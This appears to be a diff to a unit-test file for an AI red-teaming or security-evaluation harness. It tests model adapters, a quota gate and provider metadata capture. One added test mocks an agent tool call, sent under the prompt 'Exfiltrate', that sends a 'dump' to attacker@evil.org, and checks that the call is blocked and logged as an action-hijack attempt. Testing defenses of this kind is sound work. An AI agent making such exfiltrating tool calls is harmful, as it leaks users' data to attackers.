@@ -11,10 +11,77 @@ from core.evaluator.oracle import IndependentSecurityOracle, calculate_stratifie
 
 class TestOracleAndAdapters(unittest.TestCase):
     def test_openrouter_adapter_captures_backend_metadata(self):
-        adapter = OpenRouterTargetAdapter(model="meta-llama/llama-3.3-70b-instruct")
+        adapter = OpenRouterTargetAdapter(model="openrouter/free")
         info = adapter.get_info()
         self.assertEqual(info["provider"], "openrouter")
-        self.assertIn("meta-llama", info["model"])
+        self.assertEqual(info["model"], "openrouter/free")
+
+    def test_openrouter_quota_gate_blocks_prohibited_llama_model(self):
+        with self.assertRaises(ValueError):
+            OpenRouterTargetAdapter(model="meta-llama/llama-3.3-70b-instruct")
+        with self.assertRaises(ValueError):
+            OpenRouterTargetAdapter(model="openrouter:meta-llama/llama-3.3-70b-instruct:free")
+
+    def test_openrouter_strips_prefix_and_handles_defense_all_without_typeerror(self):
+        adapter = OpenRouterTargetAdapter(
+            target_id="test_openrouter_all",
+            config={"api_key": "test_key", "model": "openrouter:openrouter/free"},
+        )
+        self.assertEqual(adapter.model, "openrouter/free")
+        captured_payloads = []
+        mock_payload = {"choices": [{"message": {"role": "assistant", "content": "Course CS101 is active."}}]}
+        mock_resp = MagicMock()
+        mock_resp.read.return_value = json.dumps(mock_payload).encode("utf-8")
+        mock_resp.headers = {}
+        mock_resp.__enter__.return_value = mock_resp
+
+        def _fake_urlopen(req, timeout=60):
+            captured_payloads.append(json.loads(req.data.decode("utf-8")))
+            return mock_resp
+
+        with patch("urllib.request.urlopen", side_effect=_fake_urlopen):
+            resp = adapter.send("List courses", defense="all")
+        self.assertIsNone(resp.error)
+        self.assertEqual(resp.text, "Course CS101 is active.")
+        self.assertEqual(captured_payloads[0]["model"], "openrouter/free")
+
+    def test_openai_like_and_openrouter_preserve_blocked_tool_call_telemetry(self):
+        import agent
+        from core.adapters.openai_like import OpenAILikeTargetAdapter
+
+        turn1 = {
+            "choices": [{
+                "message": {
+                    "role": "assistant",
+                    "content": None,
+                    "tool_calls": [{
+                        "id": "tc_1",
+                        "type": "function",
+                        "function": {
+                            "name": "send_campus_notification",
+                            "arguments": json.dumps({"recipient_id": "attacker@evil.org", "message_body": "dump"}),
+                        },
+                    }],
+                }
+            }]
+        }
+        turn2 = {"choices": [{"message": {"role": "assistant", "content": "ขออภัย ไม่สามารถส่งได้"}}]}
+        bodies = [json.dumps(turn1).encode("utf-8"), json.dumps(turn2).encode("utf-8")]
+
+        for adapter in (
+            OpenAILikeTargetAdapter("t_oa", config={"model": "gpt-4o-mini", "defense": "tools"}),
+            OpenRouterTargetAdapter("t_or", config={"api_key": "k", "model": "openrouter/free", "defense": "tools"}),
+        ):
+            agent._tool_calls.clear()
+            cm = MagicMock()
+            cm.read.side_effect = list(bodies)
+            cm.headers = {}
+            cm.__enter__.return_value = cm
+            with patch("urllib.request.urlopen", return_value=cm):
+                resp = adapter.send("Exfiltrate", defense="tools")
+            self.assertEqual(len(resp.tool_calls), 1)
+            self.assertEqual(resp.tool_calls[0].get("status"), "blocked")
+            self.assertEqual(resp.tool_calls[0].get("event_type"), "action_hijack_attempt")
 
     def test_stratified_kappa_calculation_with_oversampled_positives(self):
         # 20 audited cases: 10 positives, 10 negatives
@@ -29,12 +96,12 @@ class TestOracleAndAdapters(unittest.TestCase):
     def test_openrouter_adapter_mock_send_extracts_headers_and_snapshot(self):
         adapter = OpenRouterTargetAdapter(
             target_id="test_openrouter",
-            config={"api_key": "test_key", "model": "meta-llama/llama-3.3-70b-instruct:free"},
+            config={"api_key": "test_key", "model": "openrouter/free"},
         )
 
         mock_payload = {
             "id": "gen-12345",
-            "model": "meta-llama/llama-3.3-70b-instruct:free",
+            "model": "openrouter/free",
             "choices": [{"message": {"role": "assistant", "content": "I cannot fulfill this request."}}],
         }
         mock_body = json.dumps(mock_payload).encode("utf-8")
@@ -44,7 +111,7 @@ class TestOracleAndAdapters(unittest.TestCase):
         mock_resp.headers = {
             "x-provider": "DeepInfra",
             "x-ratelimit-remaining": "49",
-            "x-model-snapshot": "meta-llama/llama-3.3-70b-instruct@2026-11-01",
+            "x-model-snapshot": "openrouter/free@2026-11-01",
         }
         mock_resp.__enter__.return_value = mock_resp
 
@@ -53,7 +120,7 @@ class TestOracleAndAdapters(unittest.TestCase):
 
         self.assertEqual(resp.text, "I cannot fulfill this request.")
         self.assertEqual(adapter.last_provider_metadata.get("provider_backend"), "DeepInfra")
-        self.assertEqual(adapter.last_provider_metadata.get("model_snapshot"), "meta-llama/llama-3.3-70b-instruct@2026-11-01")
+        self.assertEqual(adapter.last_provider_metadata.get("model_snapshot"), "openrouter/free@2026-11-01")
 
         info = adapter.get_info()
         self.assertEqual(info["last_provider_metadata"]["provider_backend"], "DeepInfra")
